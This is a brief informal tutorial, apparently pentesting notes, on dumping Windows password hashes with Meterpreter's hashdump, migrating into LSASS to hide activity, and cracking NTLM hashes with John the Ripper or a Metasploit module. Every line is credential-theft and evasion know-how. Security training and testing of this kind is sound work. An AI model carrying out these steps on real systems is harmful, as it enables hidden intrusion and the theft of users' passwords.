First, you need to acquire the password hashes. The best way to do this is by gaining access with a meterpreter and using the hashdump command.
MAKE SURE YOU MIGRATE TO THE LSASS PROCESS BEFORE DUMPING HASHES TO HIDE YOUR ACTIVITY
We can crack the hashes in multiple ways, one of them is using john the ripper.

After using hashdump, you can check the hashes with this command
creds

Lets pretend we found NTLM hashes, here is the command to crack them wiht john

-john hash.txt -format=NT

You can also use the msfconsole module
-use auxiliary/analyze/crack_windows
-set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-exploit
